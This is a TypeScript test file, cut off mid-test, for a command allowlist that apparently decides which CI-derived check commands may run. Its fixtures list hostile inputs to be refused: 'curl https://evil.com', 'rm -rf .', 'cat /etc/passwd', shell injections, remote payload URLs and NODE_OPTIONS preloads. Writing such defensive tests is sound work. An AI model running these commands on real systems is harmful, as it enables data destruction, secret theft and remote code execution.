import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { afterEach, describe, expect, it, vi } from 'vitest';
import {
  checkCommandAllowlist,
  DEFAULT_MAX_COMMANDS,
  executeCommand,
  extractCommandSignature,
  runVerify,
  STRIPPED_CHILD_ENV_KEYS,
  tokenizeCommand,
  type ExecuteCommandOptions,
  type ExecuteCommandResult,
  type VerifyWorkflowCommand,
} from '../src/verify/index.js';

function wf(
  command: string,
  extra?: Partial<Omit<VerifyWorkflowCommand, 'command'>>,
): VerifyWorkflowCommand {
  return {
    file: extra?.file ?? '.github/workflows/ci.yml',
    job: extra?.job ?? 'verify',
    command,
    ...(extra?.workingDirectory !== undefined
      ? { workingDirectory: extra.workingDirectory }
      : {}),
  };
}

function quoteIfNeeded(value: string): string {
  return value.includes(' ') ? `"${value}"` : value;
}

describe('tokenizeCommand', () => {
  it('splits plain and quoted arguments without shell expansion', () => {
    expect(tokenizeCommand('npm test')).toEqual({
      ok: true,
      tokens: ['npm', 'test'],
    });
    expect(
      tokenizeCommand('pytest tests/test_auth.py -k "login or logout"'),
    ).toEqual({
      ok: true,
      tokens: ['pytest', 'tests/test_auth.py', '-k', 'login or logout'],
    });
    expect(
      tokenizeCommand("npx mocha --grep 'handles (a|b)' test/app.js"),
    ).toEqual({
      ok: true,
      tokens: ['npx', 'mocha', '--grep', 'handles (a|b)', 'test/app.js'],
    });
  });

  it.each([
    ['empty string', ''],
    ['whitespace only', '   \t  '],
    ['newline injection', 'npm test\necho pwn'],
    ['carriage return', 'npm test\recho pwn'],
    ['unclosed double quote', 'pytest -k "login'],
    ['unclosed single quote', "pytest -k 'login"],
    ['semicolon chaining', 'npm test; echo pwn'],
    ['logical AND chaining', 'npm test && whoami'],
    ['logical OR chaining', 'npm test || echo pwn'],
    ['pipe operator', 'pytest | tee out'],
    ['background operator', 'npm test &'],
    ['command substitution $()', 'pytest $(whoami)'],
    ['quoted command substitution $()', 'pytest "$(whoami)"'],
    ['backtick command substitution', 'pytest `id`'],
    ['quoted backtick substitution', 'pytest "`id`"'],
    ['output redirection', 'npm test > /tmp/x'],
    ['input redirection', 'npm test < /etc/passwd'],
    ['unquoted variable expansion', 'pytest $HOME'],
    ['braced variable expansion', 'pytest "${IFS}pwn"'],
    ['double-quoted variable expansion', 'pytest "$HOME"'],
    ['subshell parens', '(npm test)'],
    ['unquoted tilde expansion', 'pytest ~/secret'],
    ['unquoted backslash escape', 'npm test \\; whoami'],
  ])('rejects %s: %s', (_label, command) => {
    const result = tokenizeCommand(command);
    expect(result.ok).toBe(false);
  });
});

describe('extractCommandSignature', () => {
  it('normalizes JS/TS and Python runner and subcommand shapes', () => {
    expect(extractCommandSignature(['npm', 'test'])).toEqual(['npm', 'test']);
    expect(extractCommandSignature(['npm', 'run', 'lint'])).toEqual([
      'npm',
      'run',
      'lint',
    ]);
    expect(extractCommandSignature(['pnpm', 'run', 'test'])).toEqual([
      'pnpm',
      'test',
    ]);
    expect(extractCommandSignature(['pnpm', 'test'])).toEqual(['pnpm', 'test']);
    expect(extractCommandSignature(['yarn', 'run', 'lint'])).toEqual([
      'yarn',
      'lint',
    ]);
    expect(extractCommandSignature(['yarn', 'lint'])).toEqual(['yarn', 'lint']);
    expect(
      extractCommandSignature(['npx', 'vitest', 'run', 'test/cli.test.ts']),
    ).toEqual(['npx', 'vitest', 'run']);
    expect(extractCommandSignature(['npx', 'eslint', 'src/index.ts'])).toEqual([
      'npx',
      'eslint',
    ]);
    expect(extractCommandSignature(['npx', 'tsc', '--noEmit'])).toEqual([
      'npx',
      'tsc',
    ]);
    expect(
      extractCommandSignature(['python', '-m', 'pytest', 'tests/test_a.py']),
    ).toEqual(['python', '-m', 'pytest']);
    expect(
      extractCommandSignature(['python3', '-m', 'pytest', 'tests/test_a.py']),
    ).toEqual(['python3', '-m', 'pytest']);
    expect(
      extractCommandSignature(['uv', 'run', 'pytest', 'tests/test_a.py']),
    ).toEqual(['uv', 'run', 'pytest']);
    expect(
      extractCommandSignature(['uv', 'run', 'ruff', 'check', 'src/app.py']),
    ).toEqual(['uv', 'run', 'ruff', 'check']);
    expect(extractCommandSignature(['ruff', 'check', 'src/app.py'])).toEqual([
      'ruff',
      'check',
    ]);
    expect(extractCommandSignature(['ruff', 'format', '--check'])).toEqual([
      'ruff',
      'format',
    ]);
    expect(extractCommandSignature(['pytest', 'tests/test_auth.py'])).toEqual([
      'pytest',
    ]);
    expect(extractCommandSignature(['mypy', 'src/app.py'])).toEqual(['mypy']);
    expect(extractCommandSignature(['tox', 'run', '-e', 'py312'])).toEqual([
      'tox',
      'run',
    ]);
  });
});

describe('checkCommandAllowlist', () => {
  const standardWorkflows: VerifyWorkflowCommand[] = [
    wf('npm test'),
    wf('npm run lint'),
    wf('npx vitest run'),
    wf('pytest'),
    wf('ruff check .'),
    wf('pnpm run typecheck'),
    wf('CI=true yarn run test'),
    wf('uv run pytest'),
    wf('python -m pytest'),
  ];

  it('fails closed when workflowCommands is empty', () => {
    const decision = checkCommandAllowlist('npm test', []);
    expect(decision.allowed).toBe(false);
    if (!decision.allowed) {
      expect(decision.reason).toContain('No CI workflow commands found');
    }
  });

  it.each([
    ['npm test', 'npm', ['test']],
    ['npm run lint', 'npm', ['run', 'lint']],
    ['pytest', 'pytest', []],
    ['npx vitest run', 'npx', ['vitest', 'run']],
    ['yarn run test', 'yarn', ['run', 'test']],
  ])('allows exact CI workflow command: %s', (command, binary, args) => {
    const decision = checkCommandAllowlist(command, standardWorkflows);
    expect(decision.allowed).toBe(true);
    if (decision.allowed) {
      expect(decision.binary).toBe(binary);
      expect(decision.args).toEqual(args);
    }
  });

  it.each([
    ['npx vitest run test/cli.test.ts', 'npx', ['vitest', 'run', 'test/cli.test.ts']],
    [
      'pytest tests/test_auth.py -k login',
      'pytest',
      ['tests/test_auth.py', '-k', 'login'],
    ],
    [
      'pytest tests/test_auth.py::TestAuth::test_login --exitfirst -q --maxfail=1',
      'pytest',
      ['tests/test_auth.py::TestAuth::test_login', '--exitfirst', '-q', '--maxfail=1'],
    ],
    ['npm test -- test/foo.test.ts', 'npm', ['test', '--', 'test/foo.test.ts']],
    ['ruff check src/app.py', 'ruff', ['check', 'src/app.py']],
    ['pnpm typecheck', 'pnpm', ['typecheck']],
    ['yarn test test/foo.test.ts', 'yarn', ['test', 'test/foo.test.ts']],
    ['uv run pytest tests/test_a.py -k foo', 'uv', ['run', 'pytest', 'tests/test_a.py', '-k', 'foo']],
    ['python -m pytest tests/test_a.py', 'python', ['-m', 'pytest', 'tests/test_a.py']],
  ])('allows scoped narrower CI command: %s', (command, binary, args) => {
    const decision = checkCommandAllowlist(command, standardWorkflows);
    expect(decision.allowed).toBe(true);
    if (decision.allowed) {
      expect(decision.binary).toBe(binary);
      expect(decision.args).toEqual(args);
    }
  });

  it.each([
    'curl https://evil.com',
    'rm -rf .',
    'cat /etc/passwd',
    'git push',
    'python -c "import os"',
    'node -e "process.exit(0)"',
    'npm run build',
    'ruff format src/app.py',
    'npx mocha test/app.js',
  ])('refuses non-CI tool or unmatched subcommand: %s', (command) => {
    const decision = checkCommandAllowlist(command, standardWorkflows);
    expect(decision.allowed).toBe(false);
  });

  it.each([
    'npm test; echo pwn',
    'npm test && whoami',
    'pytest | tee out',
    'pytest $(whoami)',
    'pytest `id`',
    'npm test > /tmp/x',
    'NODE_OPTIONS="--require=/tmp/evil.js" npm test',
  ])('refuses shell injection or inline env override: %s', (command) => {
    const decision = checkCommandAllowlist(command, standardWorkflows);
    expect(decision.allowed).toBe(false);
  });

  it.each([
    'npx vitest run ../../etc/passwd',
    'pytest /etc/passwd',
    'pytest ../outside/test_secret.py',
    'ruff check /etc/hosts',
    'npm test -- ../../etc/passwd',
    'npx vitest run --config=/tmp/evil.ts',
    'npx vitest run --config=../../evil.ts',
    'npx vitest run --reporter=./evil.js',
    'pytest -c /tmp/evil.ini',
    'npm test -- -e "process.exit(0)"',
    'ruff check --fix src/app.py',
  ])('refuses path traversal, absolute paths, and dangerous flags: %s', (command) => {
    const decision = checkCommandAllowlist(command, standardWorkflows);
    expect(decision.allowed).toBe(false);
  });

  it('allows a baseline flag+value pair verbatim while rejecting altered values', () => {
    const toxWorkflows = [wf('tox -e py312')];

    const allowed = checkCommandAllowlist(
      'tox -e py312 -- tests/test_auth.py',
      toxWorkflows,
    );
    expect(allowed.allowed).toBe(true);

    const refused = checkCommandAllowlist(
      'tox -e malicious -- tests/test_auth.py',
      toxWorkflows,
    );
    expect(refused.allowed).toBe(false);
  });

  it('requires exact matches for raw interpreter commands while allowing node --test scoping', () => {
    const interpWorkflows = [
      wf('python -c "print(1)"'),
      wf('node scripts/check.mjs'),
      wf('node --test'),
    ];

    expect(
      checkCommandAllowlist('python -c "print(1)"', interpWorkflows).allowed,
    ).toBe(true);
    expect(
      checkCommandAllowlist('python -c "import os"', interpWorkflows).allowed,
    ).toBe(false);
    expect(
      checkCommandAllowlist('node scripts/check.mjs', interpWorkflows).allowed,
    ).toBe(true);
    expect(
      checkCommandAllowlist('node scripts/evil.mjs', interpWorkflows).allowed,
    ).toBe(false);
    expect(
      checkCommandAllowlist('node --test test/foo.test.js', interpWorkflows)
        .allowed,
    ).toBe(true);
    expect(
      checkCommandAllowlist('node -e "process.exit(0)"', interpWorkflows)
        .allowed,
    ).toBe(false);
  });

  it('enforces exact match for path-qualified python scripts while still scoping path-qualified python -m tools', () => {
    const venvWorkflows = [
      wf('.venv/bin/python script.py'),
      wf('.venv/bin/python -m pytest'),
    ];

    expect(
      checkCommandAllowlist('.venv/bin/python script.py', venvWorkflows)
        .allowed,
    ).toBe(true);
    expect(
      checkCommandAllowlist(
        '.venv/bin/python script.py --extra-arg',
        venvWorkflows,
      ).allowed,
    ).toBe(false);
    expect(
      checkCommandAllowlist('.venv/bin/python evil.py', venvWorkflows).allowed,
    ).toBe(false);

    const scopedPytest = checkCommandAllowlist(
      '.venv/bin/python -m pytest tests/test_a.py',
      venvWorkflows,
    );
    expect(scopedPytest.allowed).toBe(true);
    if (scopedPytest.allowed) {
      expect(scopedPytest.binary).toBe('.venv/bin/python');
      expect(scopedPytest.args).toEqual(['-m', 'pytest', 'tests/test_a.py']);
    }
  });

  it('[R1-C1] defaults unknown/unmodeled tools and dangerous runners/subcommands to exact-match-only', () => {
    const exactOnlyCases: Array<[string, string]> = [
      ['custom-unmodeled-tool', 'custom-unmodeled-tool src/app.ts'],
      ['uvx ruff check .', 'uvx ruff check src/app.py'],
      ['pipx run pytest', 'pipx run pytest tests/test_a.py'],
      ['pipenv run pytest', 'pipenv run pytest tests/test_a.py'],
      ['bundle exec rspec', 'bundle exec rspec spec/a_spec.rb'],
      ['uv tool run pytest', 'uv tool run pytest tests/test_a.py'],
      ['pnpx vitest run', 'pnpx vitest run test/a.test.ts'],
      ['changeset status', 'changeset publish'],
      ['lerna run test', 'lerna publish'],
      ['turbo run test', 'turbo run deploy'],
      ['nx test app', 'nx run app:deploy'],
      ['mvn test', 'mvn deploy'],
      ['gradle test', 'gradle publish'],
      ['go run ./cmd/check', 'go run ./cmd/other'],
      ['deno run check.ts', 'deno run other.ts'],
      ['deno task test', 'deno task deploy'],
      ['hatch run test', 'hatch run deploy'],
      ['npm audit', 'npm audit fix'],
      ['npm customsub', 'npm customsub extra'],
      ['yarn customsub', 'yarn customsub extra'],
      ['pnpm customsub', 'pnpm customsub extra'],
    ];

    for (const [baselineCmd, scopedCandidate] of exactOnlyCases) {
      const baselines = [wf(baselineCmd)];
      expect(checkCommandAllowlist(baselineCmd, baselines).allowed).toBe(true);
      expect(checkCommandAllowlist(scopedCandidate, baselines).allowed).toBe(false);
    }
  });

  it('[R1-C1 / R1-N7] refuses @argfile, remote/package specifiers, and bare action positionals unless verbatim in baseline', () => {
    const workflows = [
      wf('pytest'),
      wf('npx vitest run'),
      wf('go test ./...'),
      wf('deno test'),
      wf('npm run lint'),
    ];

    const refusedCandidates = [
      'pytest @tests/args.txt',
      'pytest @scope/pkg',
      'pytest pkg@1.2.3',
      'go test github.com/evil/repo',
      'npx vitest run npm:evil-pkg',
      'deno test jsr:@evil/pkg',
      'deno test https://evil.example/payload.ts',
      'deno test http://evil.example/payload.ts',
      'pytest git+https://evil.example/repo.git',
      'npm run lint -- deploy',
      'npm run lint -- publish',
      'npm run lint -- release',
      'npm run lint -- install',
      'npm run lint -- fix',
      'npm run lint -- uninstall',
      'npm run lint -- remove',
      'npm run lint -- exec',
      'npm run lint -- eval',
    ];

    for (const candidate of refusedCandidates) {
      expect(checkCommandAllowlist(candidate, workflows).allowed).toBe(false);
    }

    // Verbatim @argfile present in baseline is still allowed on exact match
    expect(
      checkCommandAllowlist('pytest @tests/args.txt', [wf('pytest @tests/args.txt')])
        .allowed,
    ).toBe(true);
  });

  it('[R1-C1] verifies scoped positional existence and realpath containment when cwd exists on disk', () => {
    const repoDir = mkdtempSync(join(tmpdir(), 'preflight-allowlist-repo-'));
    const outsideDir = mkdtempSync(join(tmpdir(), 'preflight-allowlist-out-'));
    try {
      mkdirSync(join(repoDir, 'tests'), { recursive: true });
      mkdirSync(join(repoDir, 'pkg', 'foo'), { recursive: true });
      writeFileSync(join(repoDir, 'tests', 'test_auth.py'), 'def test_login(): pass\n', 'utf8');
      writeFileSync(join(repoDir, 'tests', 'args.txt'), '-o addopts=-s\n', 'utf8');
      writeFileSync(join(repoDir, 'pkg', 'foo', 'foo_test.go'), 'package foo\n', 'utf8');
      writeFileSync(join(outsideDir, 'secret.py'), 'SECRET = 1\n', 'utf8');
      symlinkSync(join(outsideDir, 'secret.py'), join(repoDir, 'tests', 'escaped.py'));

      const workflows = [
        wf('pytest'),
        wf('npx vitest run'),
        wf('go test ./...'),
      ];

      // Valid repo-contained targets with pytest ::nodeid, Go /..., and :line suffixes
      expect(
        checkCommandAllowlist(
          'pytest tests/test_auth.py::TestAuth::test_login -k login',
          workflows,
          { cwd: repoDir },
        ).allowed,
      ).toBe(true);
      expect(
        checkCommandAllowlist('go test ./pkg/foo/...', workflows, { cwd: repoDir })
          .allowed,
      ).toBe(true);
      expect(
        checkCommandAllowlist('npx vitest run tests/test_auth.py:1', workflows, {
          cwd: repoDir,
        }).allowed,
      ).toBe(true);

      // Nonexistent target is refused
      expect(
        checkCommandAllowlist('pytest tests/nonexistent.py', workflows, {
          cwd: repoDir,
        }).allowed,
      ).toBe(false);

      // Symlink escaping outside repo root is refused
      expect(
        checkCommandAllowlist('pytest tests/escaped.py', workflows, {
          cwd: repoDir,
        }).allowed,
      ).toBe(false);

      // @argfile is refused even when the file exists inside cwd
      expect(
        checkCommandAllowlist('pytest @tests/args.txt', workflows, {
          cwd: repoDir,
        }).allowed,
      ).toBe(false);
    } finally {
      rmSync(repoDir, { recursive: true, force: true });
      rmSync(outsideDir, { recursive: true, force: true });
    }
  });

  it('[R1-M1] refuses python interpreter binary path swaps and mismatched python versions', () => {
    const workflows = [
      wf('python -m pytest'),
      wf('uv run python -m pytest'),
    ];

    expect(
      checkCommandAllowlist('python -m pytest tests/test_a.py', workflows).allowed,
    ).toBe(true);
    expect(
      checkCommandAllowlist('uv run python -m pytest tests/test_a.py', workflows)
        .allowed,
    ).toBe(true);

    const refusedSwaps = [
      '/tmp/evil/python -m pytest',
      './bin/python3 -m pytest tests',
      'python3.99 -m pytest',
      'python3 -m pytest tests/test_a.py',
      'uv run /tmp/x/python -m pytest',
      '/tmp/evil/pytest tests/test_a.py',
    ];
    for (const candidate of refusedSwaps) {
      expect(checkCommandAllowlist(candidate, workflows).allowed).toBe(false);
    }

    // Matching python3 baseline verbatim is still allowed
    expect(
      checkCommandAllowlist('python3 -m pytest tests/test_a.py', [
        wf('python3 -m pytest'),
      ]).allowed,
    ).toBe(true);
  });

  it('[R1-M2] requires preserving baseline flags verbatim and refuses result-weakening flags', () => {
    // 1. Preserving required check/strict/max-warnings baseline flags
    expect(checkCommandAllowlist('black .', [wf('black --check .')]).allowed).toBe(false);
    expect(
      checkCommandAllowlist('black --check src/app.py', [wf('black --check .')])
        .allowed,
    ).toBe(true);

    expect(
      checkCommandAllowlist('ruff format .', [wf('ruff format --check .')])
        .allowed,
    ).toBe(false);
    expect(
      checkCommandAllowlist('ruff format --check src/app.py', [
        wf('ruff format --check .'),
      ]).allowed,
    ).toBe(true);

    expect(
      checkCommandAllowlist('cargo fmt', [wf('cargo fmt --check')]).allowed,
    ).toBe(false);
    expect(
      checkCommandAllowlist('cargo fmt --check', [wf('cargo fmt --check')])
        .allowed,
    ).toBe(true);

    expect(
      checkCommandAllowlist('isort .', [wf('isort --check-only .')]).allowed,
    ).toBe(false);
    expect(
      checkCommandAllowlist('isort --check-only src/app.py', [
        wf('isort --check-only .'),
      ]).allowed,
    ).toBe(true);

    expect(
      checkCommandAllowlist('mypy src', [wf('mypy --strict src')]).allowed,
    ).toBe(false);
    expect(
      checkCommandAllowlist('mypy --strict src/app.py', [wf('mypy --strict src')])
        .allowed,
    ).toBe(true);

    const eslintMaxWarn = [wf('npx eslint . --max-warnings 0')];
    expect(checkCommandAllowlist('npx eslint .', eslintMaxWarn).allowed).toBe(false);
    expect(
      checkCommandAllowlist('npx eslint . --max-warnings 9999', eslintMaxWarn)
        .allowed,
    ).toBe(false);
    expect(
      checkCommandAllowlist('npx eslint src/a.ts --max-warnings 0', eslintMaxWarn)
        .allowed,
    ).toBe(true);

    expect(
      checkCommandAllowlist('uv run pytest tests/test_a.py', [
        wf('uv run --locked pytest'),
      ]).allowed,
    ).toBe(false);

    // 2. Weakening flags cannot be introduced when absent from baseline
    const baseWorkflows = [
      wf('npx vitest run'),
      wf('npx jest'),
      wf('pytest'),
      wf('ruff check .'),
      wf('npx eslint .'),
    ];
    const weakeningCandidates = [
      'npx vitest run --passWithNoTests',
      'npx vitest run --pass-with-no-tests',
      'npx jest --onlyChanged',
      'pytest --collect-only',
      'pytest --co',
      'npx eslint . --no-error-on-unmatched-pattern',
      'npx eslint . --max-warnings 9999',
      'npx eslint . --max-warnings=9999',
      'ruff check --ignore ALL .',
      'ruff check --ignore=ALL .',
    ];
    for (const candidate of weakeningCandidates) {
      expect(checkCommandAllowlist(candidate, baseWorkflows).allowed).toBe(false);
    }
  });

  it('[M2-Fix-1] refuses -v version-exit-0 bypass and weakening/tool-mismatched flags while keeping pytest -m and --verbose', () => {
    const workflows = [
      wf('node --test'),
      wf('npm test'),
      wf('npm run lint'),
      wf('tsc --noEmit'),
      wf('npx eslint . --max-warnings 0'),
      wf('npx jest'),
      wf('npx prettier --check .'),
      wf('go test ./...'),
      wf('go vet ./...'),
      wf('mypy src'),
      wf('python -m mypy src'),
      wf('uv run mypy src'),
      wf('ruff check .'),
      wf('rubocop'),
      wf('rspec'),
      wf('yamllint .'),
      wf('pytest'),
      wf('python -m pytest'),
      wf('uv run pytest'),
    ];

    const refusedCandidates = [
      // -v prints version and exits 0 without running checks
      'node --test -v',
      'npm run lint -v',
      'tsc --noEmit -v',
      'npx eslint . --max-warnings 0 -v',
      'npx jest -v',
      'npx prettier --check . -v',
      'npm test -v',
      'rubocop -v',
      'rspec -v',
      'yamllint . -v',
      // 6 weakening / tool-mismatched flag nits
      'go test -n=1',
      'go test -n 1',
      'go vet -n=1',
      'go vet -n 1',
      'tsc --noEmit --skipLibCheck',
      'mypy --ignore-missing-imports src',
      'ruff check --select E9 .',
      'ruff check --select=E9 .',
      'rubocop -x',
      'rubocop -s',
      'mypy -m json',
      'mypy -m=json',
      'python -m mypy -m json',
      'uv run mypy -m json',
    ];

    for (const candidate of refusedCandidates) {
      expect(checkCommandAllowlist(candidate, workflows).allowed).toBe(false);
    }

    // Legitimate flags remain allowed
    expect(
      checkCommandAllowlist('pytest -m unit tests/test_a.py', workflows).allowed,
    ).toBe(true);
    expect(
      checkCommandAllowlist('python -m pytest -m unit tests/test_a.py', workflows)
        .allowed,
    ).toBe(true);
    expect(
      checkCommandAllowlist('uv run pytest -m unit tests/test_a.py', workflows)
        .allowed,
    ).toBe(true);
    expect(
      checkCommandAllowlist('pytest --verbose tests/test_a.py', workflows).allowed,
    ).toBe(true);
    // Verbatim -v present in the baseline still matches as a baseline flag
    expect(
      checkCommandAllowlist('pytest -v tests/test_a.py', [wf('pytest -v')])
        .allowed,
    ).toBe(true);
  });

  it('[M2-Fix-2] preserves -- separator placement for required baseline flags while allowing legitimate scoped -- arguments', () => {
    const coverageWorkflow = [wf('npm test -- --coverage')];
    expect(
      checkCommandAllowlist('npm test --coverage', coverageWorkflow).allowed,
    ).toBe(false);
    expect(
      checkCommandAllowlist('npm test --coverage -- test/a.test.ts', coverageWorkflow)
        .allowed,
    ).toBe(false);
    expect(
      checkCommandAllowlist('npm test -- --coverage test/a.test.ts', coverageWorkflow)
        .allowed,
    ).toBe(true);

    const lintMaxWarnWorkflow = [wf('npm run lint -- --max-warnings 0')];
    expect(
      checkCommandAllowlist('npm run lint --max-warnings 0', lintMaxWarnWorkflow)
        .allowed,
    ).toBe(false);
    expect(
      checkCommandAllowlist(
        'npm run lint -- --max-warnings 0 src/index.ts',
        lintMaxWarnWorkflow,
      ).allowed,
    ).toBe(true);

    const lintMaxWarnEqWorkflow = [wf('npm run lint -- --max-warnings=0')];
    expect(
      checkCommandAllowlist('npm run lint --max-warnings=0', lintMaxWarnEqWorkflow)
        .allowed,
    ).toBe(false);
    expect(
      checkCommandAllowlist(
        'npm run lint -- --max-warnings=0 src/index.ts',
        lintMaxWarnEqWorkflow,
      ).allowed,
    ).toBe(true);

    // Safe standalone flags after `--` in baseline cannot be hoisted before `--` (and vice versa)
    expect(
      checkCommandAllowlist('npm test --strict', [wf('npm test -- --strict')])
        .allowed,
    ).toBe(false);
    expect(
      checkCommandAllowlist('npm test -- --strict test/a.test.ts', [
        wf('npm test -- --strict'),
      ]).allowed,
    ).toBe(true);
    expect(
      checkCommandAllowlist('npm test -- --strict', [wf('npm test --strict')])
        .allowed,
    ).toBe(false);
    expect(
      checkCommandAllowlist('npx eslint . -- --max-warnings 0', [
        wf('npx eslint . --max-warnings 0'),
      ]).allowed,
    ).toBe(false);

    // Baseline without `--` still allows legitimate scoped `npm test -- test/foo.test.ts`
    expect(
      checkCommandAllowlist('npm test -- test/foo.test.ts', [wf('npm test')])
        .allowed,
    ).toBe(true);
  });

  it('[R1-M3] refuses shell builtins and carries safe workingDirectory for cd X && cmd while failing closed on unsafe cd', () => {
    const builtins = [
      'cd web',
      'export FOO=bar',
      'set -e',
      'unset FOO',
      'pushd web',
      'popd',
      'source .env',
      '. .env',
      'echo hi',
      'true',
      'false',
      'pwd',
      'umask 022',
      'alias a=b',
      'eval ls',
      'exec sh',
      'shift',
      'exit 0',
      'return 0',
    ];
    for (const builtinCmd of builtins) {
      expect(checkCommandAllowlist(builtinCmd, [wf(builtinCmd)]).allowed).toBe(
        false,
      );
    }

    // Safe relative `cd web && npm test`: `cd web` refused, `npm test` carries workingDirectory: 'web'
    const cdWorkflow = [wf('cd web && npm test')];
    expect(checkCommandAllowlist('cd web', cdWorkflow).allowed).toBe(false);
    const decision = checkCommandAllowlist('npm test', cdWorkflow);
    expect(decision.allowed).toBe(true);
    if (decision.allowed) {
      expect(decision.workingDirectory).toBe('web');
    }

    // Unsafe/ambiguous cd chains must fail closed so `npm test` never runs in repo root
    const unsafeCdWorkflows = [
      'cd ../outside && npm test',
      'cd /tmp && npm test',
      'cd $SUBDIR && npm test',
      'cd && npm test',
      'cd - && npm test',
      'pushd web && npm test',
    ];
    for (const cmd of unsafeCdWorkflows) {
      expect(checkCommandAllowlist('npm test', [wf(cmd)]).allowed).toBe(false);
    }
  });
});

describe('runVerify (unit tests with mocked spawnCommand)', () => {
  const workflows: VerifyWorkflowCommand[] = [
    wf('npm test'),
    wf('npm run lint'),
    wf('npx vitest run', { workingDirectory: 'packages/core' }),
    wf('pytest', { workingDirectory: '../escape' }),
  ];

  it('returns "these checks passed" when all executed allowlisted checks exit 0', async () => {
    const calls: Array<{
      binary: string;
      args: readonly string[];
      options: ExecuteCommandOptions;
    }> = [];
    const spawnCommand = vi.fn(
      async (
        binary: string,
        args: readonly string[],
        options: ExecuteCommandOptions,
      ): Promise<ExecuteCommandResult> => {
        calls.push({ binary, args, options });
        return {
          status: 'passed',
          exitCode: 0,
          durationMs: 12,
          stdout: 'ok',
          stderr: '',
        };
      },
    );

    const result = await runVerify(
      ['npm run lint', 'npm test -- test/cli.test.ts', 'curl https://evil.com'],
      workflows,
      { cwd: '/repo', spawnCommand },
    );

    expect(spawnCommand).toHaveBeenCalledTimes(2);
    expect(calls[0]?.binary).toBe('npm');
    expect(calls[0]?.args).toEqual(['run', 'lint']);
    expect(calls[1]?.args).toEqual(['test', '--', 'test/cli.test.ts']);

    expect(result.verdict).toBe('passed');
    expect(result.verdictMessage).toBe('these checks passed');
    expect(result.verdictMessage.toLowerCase()).not.toContain('ci will pass');
    expect(result.refusedCommands).toHaveLength(1);
    expect(result.refusedCommands[0]?.command).toBe('curl https://evil.com');
    expect(result.results.map((r) => r.status)).toEqual([
      'passed',
      'passed',
      'refused',
    ]);
  });

  it('returns "these checks failed" when any executed check exits non-zero or times out', async () => {
    let callIndex = 0;
    const spawnCommand = vi.fn(
      async (): Promise<ExecuteCommandResult> => {
        callIndex += 1;
        if (callIndex === 1) {
          return {
            status: 'passed',
            exitCode: 0,
            durationMs: 10,
            stdout: 'lint ok',
            stderr: '',
          };
        }
        return {
          status: 'failed',
          exitCode: 1,
          durationMs: 25,
          stdout: '',
          stderr: '1 test failed',
        };
      },
    );

    const result = await runVerify(
      ['npm run lint', 'npm test'],
      workflows,
      { cwd: '/repo', spawnCommand },
    );

    expect(result.verdict).toBe('failed');
    expect(result.verdictMessage).toBe('these checks failed');
    expect(result.verdictMessage.toLowerCase()).not.toContain('ci will pass');
    expect(result.results[0]?.status).toBe('passed');
    expect(result.results[1]?.status).toBe('failed');
    expect(result.results[1]?.exitCode).toBe(1);
  });

  it('returns "no allowlisted checks were executed" when all commands are refused, workflows empty, or candidates empty', async () => {
    const spawnCommand = vi.fn(
      async (
        _binary: string,
        _args: readonly string[],
        _options: ExecuteCommandOptions,
      ): Promise<ExecuteCommandResult> => {
        throw new Error('spawnCommand must not be invoked for refused commands');
      },
    );

    const refusedOnly = await runVerify(
      ['rm -rf .', 'npm test && whoami'],
      workflows,
      { cwd: '/repo', spawnCommand },
    );
    expect(spawnCommand).not.toHaveBeenCalled();
    expect(refusedOnly.verdict).toBe('no_checks_run');
    expect(refusedOnly.verdictMessage).toBe(
      'no allowlisted checks were executed',
    );
    expect(refusedOnly.refusedCommands).toHaveLength(2);
    expect(refusedOnly.results.every((r) => r.status === 'refused')).toBe(true);

    const noWorkflows = await runVerify(['npm test'], [], {
      cwd: '/repo',
      spawnCommand,
    });
    expect(spawnCommand).not.toHaveBeenCalled();
    expect(noWorkflows.verdict).toBe('no_checks_run');
    expect(noWorkflows.verdictMessage).toBe(
      'no allowlisted checks were executed',
    );
    expect(noWorkflows.refusedCommands).toHaveLength(1);

    const emptyCandidates = await runVerify([], workflows, {
      cwd: '/repo',
      spawnCommand,
    });
    expect(emptyCandidates.verdict).toBe('no_checks_run');
    expect(emptyCandidates.verdictMessage).toBe(
      'no allowlisted checks were executed',
    );
    expect(emptyCandidates.results).toEqual([]);
  });

  it('respects valid repo-internal workingDirectory and refuses escaping workingDirectory', async () => {
    const seenCwds: string[] = [];
    const spawnCommand = vi.fn(
      async (
        _binary: string,
        _args: readonly string[],
        options: ExecuteCommandOptions,
      ): Promise<ExecuteCommandResult> => {
        seenCwds.push(options.cwd);
        return {
          status: 'passed',
          exitCode: 0,
          durationMs: 5,
          stdout: '',
          stderr: '',
        };
      },
    );

    const result = await runVerify(
      ['npx vitest run test/a.test.ts', 'pytest'],
      workflows,
      { cwd: '/repo', spawnCommand },
    );

    expect(spawnCommand).toHaveBeenCalledTimes(1);
    expect(seenCwds).toEqual([resolve('/repo', 'packages/core')]);
    expect(result.results[0]?.status).toBe('passed');
    expect(result.results[1]?.status).toBe('refused');
    expect(result.refusedCommands).toHaveLength(1);
    expect(result.refusedCommands[0]?.command).toBe('pytest');
  });

  it('[R1-M3] executes cd web && npm test in repo/web and never in repo root', async () => {
    const seenCwds: string[] = [];
    const spawnCommand = vi.fn(
      async (
        _binary: string,
        _args: readonly string[],
        options: ExecuteCommandOptions,
      ): Promise<ExecuteCommandResult> => {
        seenCwds.push(options.cwd);
        return {
          status: 'passed',
          exitCode: 0,
          durationMs: 5,
          stdout: 'ok',
          stderr: '',
        };
      },
    );

    const result = await runVerify(
      ['cd web', 'npm test'],
      [wf('cd web && npm test')],
      { cwd: '/repo', spawnCommand },
    );

    expect(spawnCommand).toHaveBeenCalledTimes(1);
    expect(seenCwds).toEqual([resolve('/repo', 'web')]);
    expect(result.results.map((r) => r.status)).toEqual(['refused', 'passed']);
  });

  it('[R1-N5] caps executed candidate commands to maxCommands (default 8) and records excess as refused', async () => {
    const spawnCommand = vi.fn(
      async (): Promise<ExecuteCommandResult> => ({
        status: 'passed',
        exitCode: 0,
        durationMs: 5,
        stdout: 'ok',
        stderr: '',
      }),
    );

    const tenCandidates = Array.from(
      { length: 10 },
      (_, idx) => `pytest tests/test_${idx + 1}.py`,
    );

    expect(DEFAULT_MAX_COMMANDS).toBe(8);
    const defaultCap = await runVerify(tenCandidates, [wf('pytest')], {
      cwd: '/repo',
      spawnCommand,
    });
    expect(spawnCommand).toHaveBeenCalledTimes(8);
    expect(defaultCap.verdict).toBe('passed');
    expect(defaultCap.refusedCommands).toHaveLength(2);
    expect(defaultCap.refusedCommands[0]?.reason).toMatch(/maximum commands/i);
    expect(
